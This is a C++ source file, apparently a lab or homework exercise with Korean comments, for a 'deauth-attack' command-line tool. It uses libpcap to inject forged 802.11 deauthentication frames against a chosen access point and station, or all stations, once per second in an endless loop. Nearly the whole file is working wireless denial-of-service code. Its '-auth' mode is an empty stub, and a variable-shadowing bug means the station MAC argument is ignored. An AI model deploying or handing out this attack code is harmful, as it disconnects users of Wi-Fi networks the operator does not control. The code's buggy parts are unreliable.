#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <csignal>

#include <pcap.h>

#include "mac.h"
#include "deauth_packet.h"
#include "radiotap.h"

using namespace std;

static void usage()
{
    cerr << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n"
         << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

void sendDeauthPacket(pcap_t *handle, const Mac &ap_mac, const Mac &st_mac)
{
    // 1. Radiotap 헤더 생성
    RadiotapHeader radiotap;
    vector<uint8_t> rtBytes = radiotap.toBytes();

    // 2. Deauth 802.11 관리 프레임 생성
    DeauthPacket deauth(ap_mac, st_mac);
    vector<uint8_t> deauthBytes = deauth.toBytes();

    // 3. Radiotap 헤더 + Deauth 프레임 결합
    vector<uint8_t> fullPacket;
    fullPacket.reserve(rtBytes.size() + deauthBytes.size());
    fullPacket.insert(fullPacket.end(), rtBytes.begin(), rtBytes.end());
    fullPacket.insert(fullPacket.end(), deauthBytes.begin(), deauthBytes.end());

    // 4. pcap_sendpacket로 전송
    if (pcap_sendpacket(handle, fullPacket.data(), fullPacket.size()) != 0)
    {
        cerr << "Error sending the packet: " << pcap_geterr(handle) << endl;
    }
}
void sendAuthPacket(pcap_t *handle, const string &iface, const Mac &ap_mac, const Mac &st_mac)
{
    return;
}

int main(int argc, char *argv[])
{
    if (argc < 3 || argc > 5)
    {
        usage();
        exit(EXIT_FAILURE);
    }

    // 명령줄 인자 파싱
    string iface = argv[1];
    Mac ap_mac = Mac(argv[2]);

    // AP MAC 주소가 유효하지 않으면 에러 메시지를 출력하고 프로그램을 종료한다.
    if (!ap_mac.isValid())
    {
        cerr << "Invalid AP MAC address: " << argv[2] << endl;
        exit(EXIT_FAILURE);
    }

    bool do_auth = false;
    Mac st_mac = Mac("FF:FF:FF:FF:FF:FF");

    // argc가 4~5 사이일 때
    if (argc >= 4)
    {
        Mac st_mac = Mac(argv[3]);

        // Station MAC 주소가 유효하지 않으면 에러 메시지를 출력하고 프로그램을 종료한다.
        if (!st_mac.isValid())
        {
            cerr << "Invalid Station MAC address: " << argv[3] << endl;
            exit(EXIT_FAILURE);
        }

        // argc가 5일 때
        if (argc == 5)
        {
            // "-auth" 문자열이 주어지면 do_auth를 true로 설정한다.
            if (string(argv[4]) == "-auth")
            {
                do_auth = true;
            }
            else
            {
                usage();
                exit(EXIT_FAILURE);
            }
        }
    }

    // ctrl c 동작 설정
    signal(SIGINT, [](int)
           {
        cout << "Quit" << endl;
        exit(EXIT_SUCCESS); });
    signal(SIGTERM, [](int)
           {
        cout << "Quit" << endl;
        exit(EXIT_SUCCESS); });

    // 설정값 확인
    cout << "Interface: " << iface << endl;
    cout << "AP MAC: " << ap_mac << endl;
    cout << "Station MAC: " << st_mac << endl;
    cout << "Auth: " << (do_auth ? "true" : "false") << endl;
    cout << "========================================" << endl;
    cout << "Press Ctrl-C to quit" << endl;
    cout << "========================================" << endl;

    // pcap 설정
    char errbuf[PCAP_ERRBUF_SIZE];
    // promiscuous=1, read_timeout=1000ms
    pcap_t *handle = pcap_open_live(iface.c_str(), 1024, 1, 1000, errbuf);
    if (!handle)
    {
        cerr << "pcap_open_live(" << iface << ") failed: " << errbuf << endl;
        exit(EXIT_FAILURE);
    }

    // Radiotap/Monitor check
    if (pcap_datalink(handle) != DLT_IEEE802_11_RADIO)
    {
        cerr << "[-] Not a Radiotap(802.11) interface. Try enabling monitor mode.\n";
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }

    while (true)
    {
        // deauth 패킷 전송
        if (do_auth)
        {
            // auth 패킷 전송
            cout << "Send auth packet" << endl;
            sendAuthPacket(handle, iface, ap_mac, st_mac);
        }
        else
        {
            // deauth 패킷 전송
            cout << "Send deauth packet" << endl;
            sendDeauthPacket(handle, ap_mac, st_mac);
        }
        sleep(1);
    }

    pcap_close(handle);
    return 0;
}
